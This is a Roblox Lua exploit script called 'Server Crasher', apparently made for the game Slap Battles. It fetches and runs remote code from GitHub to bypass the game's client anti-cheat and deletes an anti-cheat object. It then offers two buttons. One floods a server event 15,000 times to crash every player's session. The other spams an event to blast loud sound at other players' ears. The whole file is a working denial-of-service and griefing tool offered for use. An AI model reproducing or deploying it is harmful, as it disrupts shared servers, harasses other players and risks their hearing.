local place = "Slap Battles"
loadstring(game:HttpGet("https://raw.githubusercontent.com/NewNexer/NexerHub/refs/heads/main/SB/Modules/CleanClientAntiCheat.luau"))(place)
if game:GetService("Players").LocalPlayer.PlayerScripts.BACKEND.Systems:FindFirstChild("VFXReplication") and game:GetService("Players").LocalPlayer.PlayerScripts.BACKEND.Systems.VFXReplication:FindFirstChild("RobTransform") then
    game:GetService("Players").LocalPlayer.PlayerScripts.BACKEND.Systems.VFXReplication.RobTransform:Destroy()
end

local _version = "1.6.66"
local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/download/".._version.."/main.lua"))()
local Window = WindUI:CreateWindow({
    Title = "Server Crasher",
    Icon = "gravity:logo-github",
    Author = "by Nexer",
	Theme = "Rose",
    Transparent = true,
    OpenButton = {
        Title = "Server Crasher",
        CornerRadius = UDim.new(1, 0),
        StrokeThickness = 2,
        Enabled = true,
        Draggable = true,
        OnlyMobile = false,
        Scale = 1,
    },
})
local Main = Window:Tab({
    Title = "Main",
    Desc = "Main Script.",
    Icon = "gravity:house",
})
local PingInfo = Main:Paragraph({
    Title = "Your connection status",
    Desc = "Stable ✅ ( ?ms )"
})
local lastping = -1
local lastwhenchagned = tick()
local stablern = true
game:GetService("RunService").RenderStepped:Connect(function()
    local ping = (game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()):match("%d+")
    if ping ~= lastping then
        lastping = ping
        lastwhenchagned = tick()
        stablern = true
    elseif tick() - lastwhenchagned > 3 then
        stablern = false
    end
    if stablern==true then
        PingInfo:SetDesc("Stable ✅ ("..tostring(ping).."ms )")
    else
        PingInfo:SetDesc("Unstable ⚠ ("..tostring(ping).."ms )")
    end
end)

Main:Button({
    Title = "Crash Everyone",
    Callback = function()
		if (game:GetService("Players").LocalPlayer.Character:FindFirstChild("Impostor")==nil and game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Impostor")==nil) and not (game:GetService("Players").LocalPlayer.leaderstats.Glove.Value=="Impostor" and (game:GetService("Players").LocalPlayer.Character:FindFirstChild("Default") or game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Default"))) then
        	WindUI:Notify({
            	Title = "Error",
            	Content = "Equip ''Impostor'' glove and enter arena!",
            	Icon = "gravity:triangle-exclamation",
            	Duration = 6,
        	})
			return
		end
		if stablern==false then
        	WindUI:Notify({
            	Title = "Error",
            	Content = "Your connection is not stable. Try again later!",
            	Icon = "gravity:triangle-exclamation",
            	Duration = 6,
        	})
			return
		end
        WindUI:Notify({
            Title = "Success",
            Content = "You crashed everyone haha",
            Icon = "gravity:circle-check",
            Duration = 6,
        })
        game:GetService("ReplicatedStorage").GeneralAbility:FireServer("rob")
        task.wait(.333)
        local spam = game:GetService("ReplicatedStorage").Events.Impostor
        for i=1,15000 do
            spam:FireServer()
        end
    end
})

Main:Button({
    Title = "Blow everyone's ears out",
    Callback = function()
		if (game:GetService("Players").LocalPlayer.Character:FindFirstChild("Impostor")==nil and game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Impostor")==nil) and not (game:GetService("Players").LocalPlayer.leaderstats.Glove.Value=="Impostor" and (game:GetService("Players").LocalPlayer.Character:FindFirstChild("Default") or game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Default"))) then
        	WindUI:Notify({
            	Title = "Error",
            	Content = "Equip ''Impostor'' glove and enter arena!",
            	Icon = "gravity:triangle-exclamation",
            	Duration = 6,
        	})
			return
		end
		if stablern==false then
        	WindUI:Notify({
            	Title = "Error",
            	Content = "Your connection is not stable. Try again later!",
            	Icon = "gravity:triangle-exclamation",
            	Duration = 6,
        	})
			return
		end
        WindUI:Notify({
            Title = "Success",
            Content = "Rip headphones users",
            Icon = "gravity:circle-check",
            Duration = 6,
        })
        game:GetService("ReplicatedStorage").GeneralAbility:FireServer("God's Hand")
        task.wait(.333)
        local spam = game:GetService("ReplicatedStorage").Events.Impostor
        for i=1,10000 do
            spam:FireServer()
        end
    end
})
